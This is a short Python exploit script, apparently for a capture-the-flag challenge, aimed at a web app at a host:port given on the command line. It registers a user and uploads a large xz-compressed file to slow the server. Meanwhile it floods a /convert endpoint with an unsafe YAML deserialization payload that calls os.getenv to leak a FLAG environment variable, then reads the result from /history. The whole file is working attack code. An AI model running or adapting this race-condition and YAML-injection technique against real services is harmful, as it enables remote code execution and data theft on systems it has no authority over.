import requests
import re
import time
import sys
import lzma
import threading
#ipsocket = "172.24.5.2:8080"
ipsocket = sys.argv[1]
BASE = f"http://{ipsocket}"
## create yaml file.yaml.xz
filename = "slow.yaml.xz"
def create_yaml_file(filename):
    content = b"0" * (1024*1024*5)
    with lzma.open(filename, "w") as f:
        f.write(content)

create_yaml_file(filename)


s = requests.Session()
## register user -----------------------
username = "5"
password = "5"
data = {
    "username": username,
    "password": password
}
resp = s.post(f"{BASE}/register", data=data)
## login to user
resp = s.post(f"{BASE}/login", data=data)
## register user -----------------------


def trigger_import():
    f = open(filename, "rb")
    file = {"file": (filename, f)}

    resp = s.post(f"{BASE}/import", files=file)
def send_exploit():
    time.sleep(0.05)
    payload = "!!python/object/apply:os.getenv ['FLAG']"
    data = {
    "yaml_input": payload
    }
    for i in range(100):
        try:
            print(f"Sending exploit attempt {i+1}/100")
            resp = s.post(f"{BASE}/convert",data=data,timeout=0.5)
        except requests.exceptions.Timeout:
            pass
# Create threads
t1 = threading.Thread(target=trigger_import)
t2 = threading.Thread(target=send_exploit)

# Start threads
t1.start()
t2.start()

# Wait for both to finish
t1.join()
t2.join()


page = s.get(f"{BASE}/history").text
print(page)
#print(page)